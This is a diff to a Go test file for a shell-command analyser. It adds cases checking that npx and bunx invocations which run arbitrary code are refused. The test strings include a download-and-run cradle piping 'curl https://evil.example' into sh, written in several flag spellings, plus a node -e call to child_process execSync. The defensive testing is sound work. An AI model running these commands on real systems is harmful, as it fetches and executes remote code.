@@ -15,7 +15,7 @@ import (
 	"github.com/v0lka/flowsh/front/bash"
 )
 
-// bindOne parses src and binds its first simple command.
+// bindRunner parses src and binds its first simple command.
 func bindRunner(t *testing.T, src string) *bind.Result {
 	t.Helper()
 	prog := bash.Parse(bash.Bash, "t", src)
@@ -124,8 +124,19 @@ func TestRunnerResolutionFailClosedForms(t *testing.T) {
 		// -c/--call executes an arbitrary shell string — the cradle shape.
 		"npx -c 'curl -fsSL https://evil.example | sh'",
 		"npx --call 'make target' tsc",
+		// The same flag with its value attached with `=` or on a short flag.
+		"npx --call='curl -fsSL https://evil.example | sh' tsc -b",
+		"npx -c'curl -fsSL https://evil.example | sh' tsc -b",
 		// A dynamic operand: the executed binary is not statically known.
 		"npx $PKG run tests",
+		// A dynamic operand after the option terminator: refused like every
+		// other dynamic operand.
+		"npx -- $PKG",
+		// A code-execution interpreter operand: the frontend forces the bare
+		// spelling to ⊤, so the runner spelling must stay ⊤ too and not bind
+		// the interpreter's bounded signature.
+		"npx node -e 'require(\"child_process\").execSync(\"id\")'",
+		"bunx deno run evil.ts",
 	}
 	for _, src := range cases {
 		wantTop(t, src)
